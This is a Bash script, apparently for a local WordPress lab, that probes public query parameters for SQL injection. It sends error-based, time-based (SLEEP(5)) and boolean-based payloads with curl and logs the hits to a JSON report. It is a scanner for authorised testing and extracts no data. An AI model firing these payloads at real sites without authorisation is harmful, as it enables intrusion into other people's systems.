#!/bin/bash
set -e

TARGET_BASE="${TARGET_BASE:-http://localhost:8888/wordpress-zeroday}"
RESULTS_DIR="results"
OUTPUT_JSON="${RESULTS_DIR}/wfuzz_results.json"

mkdir -p "${RESULTS_DIR}"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "⚡ wfuzz - 실전 SQLi 탐지 💪"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Target: ${TARGET_BASE}"
echo ""

# 연결 확인
echo "🔗 타겟 서버 연결 확인 중..."
if curl -s --max-time 5 "${TARGET_BASE}" > /dev/null 2>&1; then
    echo "✅ 서버 접근 가능"
else
    echo "❌ 서버 접근 불가!"
    echo '{"scan_type":"parameter_fuzzing","tool":"wfuzz","results":[],"error":"Target unreachable"}' > "${OUTPUT_JSON}"
    exit 0
fi

echo ""
echo "🎯 실제 취약점 탐지 모드"
echo "  - Error-based SQLi"
echo "  - Time-based SQLi (5초)"
echo "  - Boolean-based SQLi"
echo ""

# 실전 엔드포인트 (공개 페이지 우선!)
ENDPOINTS=(
    "search-s:/?s="
    "p-p:/?p="
    "page_id-page_id:/?page_id="
    "cat-cat:/?cat="
    "author-author:/?author="
    "m-m:/?m="
)

# JSON 시작
cat > "${OUTPUT_JSON}" << JSONSTART
{
  "scan_type": "parameter_fuzzing",
  "tool": "wfuzz",
  "target": "${TARGET_BASE}",
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "results": [
JSONSTART

first=true
vuln_count=0

for entry in "${ENDPOINTS[@]}"; do
    name="${entry%%:*}"
    endpoint="${entry#*:}"
    param=$(echo "$name" | cut -d'-' -f2)
    
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "Testing: ${name}"
    echo "  URL: ${TARGET_BASE}${endpoint}"
    echo ""
    
    # 1. Error-based SQLi
    echo "  [1/3] Error-based SQLi..."
    error_response=$(curl -s --max-time 10 "${TARGET_BASE}${endpoint}1'" 2>&1 || true)
    
    if echo "$error_response" | grep -iq "SQL\|mysql\|syntax\|database\|query"; then
        echo "  🚨 SQL 에러 발견!"
        vuln_count=$((vuln_count + 1))
        
        [ "$first" = false ] && echo "," >> "${OUTPUT_JSON}"
        first=false
        
        cat >> "${OUTPUT_JSON}" << VULNEOF
    {
      "endpoint": "${name}",
      "url": "${TARGET_BASE}${endpoint}",
      "parameter": "${param}",
      "payload": "1'",
      "vulnerability": "error-based-sqli",
      "severity": "HIGH",
      "evidence": "SQL error in response",
      "potential_zero_day": true
    }
VULNEOF
        echo "  ✅ Error-based SQLi 확인!"
        echo ""
        continue
    fi
    echo "  ✅ Error-based: 안전"
    
    # 2. Time-based SQLi (5초!)
    echo "  [2/3] Time-based SQLi (5s)..."
    start=$(date +%s)
    curl -s --max-time 15 \
        "${TARGET_BASE}${endpoint}1' AND SLEEP(5)-- -" > /dev/null 2>&1 || true
    end=$(date +%s)
    duration=$((end - start))
    
    echo "  Response time: ${duration}s (threshold: 5s)"
    
    if [ "$duration" -ge 5 ] && [ "$duration" -le 10 ]; then
        echo "  🚨 Time-based SQLi 발견!"
        vuln_count=$((vuln_count + 1))
        
        [ "$first" = false ] && echo "," >> "${OUTPUT_JSON}"
        first=false
        
        cat >> "${OUTPUT_JSON}" << VULNEOF
    {
      "endpoint": "${name}",
      "url": "${TARGET_BASE}${endpoint}",
      "parameter": "${param}",
      "payload": "1' AND SLEEP(5)-- -",
      "response_time": "${duration}s",
      "vulnerability": "time-based-sqli",
      "severity": "CRITICAL",
      "potential_zero_day": true
    }
VULNEOF
        echo "  ✅ Time-based SQLi 확인!"
        echo ""
        continue
    fi
    echo "  ✅ Time-based: 안전 (${duration}s)"
    
    # 3. Boolean-based SQLi
    echo "  [3/3] Boolean-based SQLi..."
    
    # TRUE 조건
    true_response=$(curl -s --max-time 10 "${TARGET_BASE}${endpoint}1' AND '1'='1" 2>&1 || true)
    true_length=${#true_response}
    
    # FALSE 조건
    false_response=$(curl -s --max-time 10 "${TARGET_BASE}${endpoint}1' AND '1'='2" 2>&1 || true)
    false_length=${#false_response}
    
    # 응답 차이 확인 (10% 이상 차이)
    diff=$((true_length - false_length))
    if [ "$diff" -lt 0 ]; then
        diff=$((-diff))
    fi
    
    threshold=$((true_length / 10))
    
    if [ "$diff" -gt "$threshold" ] && [ "$threshold" -gt 10 ]; then
        echo "  🚨 Boolean-based SQLi 발견!"
        echo "    TRUE response: ${true_length} bytes"
        echo "    FALSE response: ${false_length} bytes"
        echo "    Difference: ${diff} bytes"
        
        vuln_count=$((vuln_count + 1))
        
        [ "$first" = false ] && echo "," >> "${OUTPUT_JSON}"
        first=false
        
        cat >> "${OUTPUT_JSON}" << VULNEOF
    {
      "endpoint": "${name}",
      "url": "${TARGET_BASE}${endpoint}",
      "parameter": "${param}",
      "payload": "1' AND '1'='1 vs 1' AND '1'='2",
      "vulnerability": "boolean-based-sqli",
      "severity": "HIGH",
      "evidence": "Response difference: ${diff} bytes",
      "potential_zero_day": true
    }
VULNEOF
        echo "  ✅ Boolean-based SQLi 확인!"
    else
        echo "  ✅ Boolean-based: 안전"
    fi
    
    echo ""
done

# JSON 종료
cat >> "${OUTPUT_JSON}" << JSONEND
  ]
}
JSONEND

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ wfuzz 스캔 완료"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "결과: ${OUTPUT_JSON}"
echo "발견된 취약점: ${vuln_count}개"